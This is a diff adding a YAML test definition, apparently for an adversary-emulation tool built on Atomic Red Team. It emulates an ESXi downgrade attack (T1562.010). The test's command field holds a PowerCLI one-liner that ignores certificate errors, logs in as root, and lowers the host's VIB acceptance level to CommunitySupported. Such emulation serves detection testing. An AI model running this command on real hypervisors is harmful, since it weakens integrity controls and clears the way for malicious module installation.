@@ -1,0 +1,58 @@
+- id: 062f92c9-28b1-4391-a5f8-9d8ca6852091
+  name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
+  description: 'An adversary can change the VIB acceptance level to CommunitySupported
+    to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards
+    an adversary may proceed to installing malicious VIBs on the host.
+
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.010
+    name: 'Impair Defenses: Downgrade Attack'
+  platforms:
+    linux:
+      psh:
+        command: Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false
+          -Confirm:$false; Connect-VIServer -Server atomic.local -User root -Password
+          pass; (Get-EsxCli -VMHost atomic.local -V2).software.acceptance.set.Invoke(@{level
+          = "CommunitySupported"}); Disconnect-VIServer -Confirm:$false
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.010
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      vm_host:
+        description: Specify the host name of the ESXi Server
+        type: string
+        default: atomic.local
+      vm_user:
+        description: Specify the privilege user account on ESXi Server
+        type: string
+        default: root
+      vm_pass:
+        description: Specify the privilege user password on ESXi Server
+        type: string
+        default: pass
+    dependencies:
+    - description: 'Check if VMWARE PowerCLI PowerShell Module is installed.
+
+        '
+      prereq_command: '$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
+
+        if (-not $RequiredModule) {exit 1}
+
+        '
+      get_prereq_command: 'Install-Module -Name VMware.PowerCLI -Confirm:$false
+
+        '
+    technique_created: '2021-10-08T14:06:28.212Z'
+    atomic_guid: 062f92c9-28b1-4391-a5f8-9d8ca6852091
+    import_timestamp: '2025-06-24T11:15:55.662149Z'
